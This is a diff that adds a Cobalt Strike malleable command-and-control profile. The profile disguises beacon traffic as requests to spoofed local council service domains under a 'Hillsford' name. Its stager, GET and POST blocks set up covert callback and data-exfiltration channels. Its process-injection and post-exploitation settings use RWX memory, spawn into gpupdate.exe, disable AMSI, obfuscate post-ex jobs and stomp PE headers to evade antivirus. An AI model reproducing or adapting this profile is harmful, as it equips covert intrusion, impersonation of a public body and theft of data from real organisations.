@@ -1,0 +1,189 @@
+# Global Options
+set sample_name "HillsfordCouncilProfile";
+set sleeptime "60000";  # Adjust as needed (in milliseconds)
+set jitter "20";  # 20% jitter
+set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3";
+
+# Stager configuration for x86 and x64
+http-stager {
+    set uri_x86 "/main/landingpage.html";
+    set uri_x64 "/main/landingpage.html";
+
+    client {
+        header "Host" "localservices.hilsfordcouncil.au";  # Spoofed Host
+        header "Accept" "*/*";
+        metadata {
+            base64url;
+        }
+        parameter "id";
+    }
+
+    server {
+        output {
+            base64url;
+            print;
+        }
+    }
+}
+
+# Primary Domain - localservices.hilsfordcouncil.au
+http-get {
+    set uri "/services/water/rates /services/electricity/outage-updates /services/garbage-collection";
+
+    client {
+        header "Host" "localservices.hilsfordcouncil.au";  # Spoofed Host
+        header "Accept" "*/*";
+        metadata {
+            base64url;
+        }
+        parameter "file";
+    }
+
+    server {
+        output {
+            base64url;
+            print;
+        }
+    }
+}
+
+# Fallback Domain 1 - remoteservices.hilsford.au
+http-get "remoteservices_variant" {
+    set uri "/utilities/power/schedule /internet/connection-check /phone-service/outage-report";
+
+    client {
+        header "Host" "remoteservices.hilsford.au";  # Spoofed Host
+        header "Accept" "*/*";
+        metadata {
+            base64url;
+        }
+        parameter "file";
+    }
+
+    server {
+        output {
+            base64url;
+            print;
+        }
+    }
+}
+
+# Fallback Domain 2 - environmentalservices.hilsford.au
+http-get "environmentalservices_variant" {
+    set uri "/air-quality/reports /water-conservation/status /waste-management/schedule";
+
+    client {
+        header "Host" "environmentalservices.hilsford.au";  # Spoofed Host
+        header "Accept" "*/*";
+        metadata {
+            base64url;
+        }
+        parameter "file";
+    }
+
+    server {
+        output {
+            base64url;
+            print;
+        }
+    }
+}
+
+# HTTP POST Variants for Data Exfiltration (if needed)
+http-post {
+    set uri "/services/water/rates /services/electricity/outage-updates /services/garbage-collection";
+
+    client {
+        header "Host" "localservices.hilsfordcouncil.au";  # Spoofed Host
+        header "Accept" "*/*";
+        metadata {
+            base64url;
+        }
+        parameter "file";
+    }
+
+    server {
+        output {
+            base64url;
+            print;
+        }
+    }
+}
+
+http-post "remoteservices_variant_post" {
+    set uri "/utilities/power/schedule /internet/connection-check /phone-service/outage-report";
+
+    client {
+        header "Host" "remoteservices.hilsford.au";  # Spoofed Host
+        header "Accept" "*/*";
+        metadata {
+            base64url;
+        }
+        parameter "file";
+    }
+
+    server {
+        output {
+            base64url;
+            print;
+        }
+    }
+}
+
+http-post "environmentalservices_variant_post" {
+    set uri "/air-quality/reports /water-conservation/status /waste-management/schedule";
+
+    client {
+        header "Host" "environmentalservices.hilsford.au";  # Spoofed Host
+        header "Accept" "*/*";
+        metadata {
+            base64url;
+        }
+        parameter "file";
+    }
+
+    server {
+        output {
+            base64url;
+            print;
+        }
+    }
+}
+
+# Process Injection - This defines how the beacon injects itself into processes
+process-inject {
+    set allocator "NtMapViewOfSection";  # More stealthy injection method
+    set min_alloc "16700";  # Minimum allocation size in bytes
+
+    # Use RWX (Read-Write-Execute) memory for process injection
+    set startrwx "true";
+
+    # Enable sleep mask (sleeping the beacon in RWX memory is detected by AVs)
+    set sleep_mask "true";
+
+    execute {
+        # CreateThread is used for self-injection
+        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";
+    }
+}
+
+# Post-Exploitation Configuration (for running post-ex jobs)
+post-ex {
+    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";  # Dummy process for 32-bit jobs
+    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";  # Dummy process for 64-bit jobs
+
+    # Enable obfuscation of post-ex tasks
+    set obfuscate "true";
+
+    # SmartInject attempts to hide the post-ex DLL
+    set smartinject "true";
+
+    # Disable AMSI (Anti-Malware Scan Interface) for PowerShell jobs
+    set amsi_disable "true";
+}
+
+# Sleep Mask - Obfuscating the beacon when it sleeps
+stage {
+    set sleep_mask "true";  # Encrypts the beacon's memory while sleeping
+    set stomppe "true";  # Pe header stomping
+}
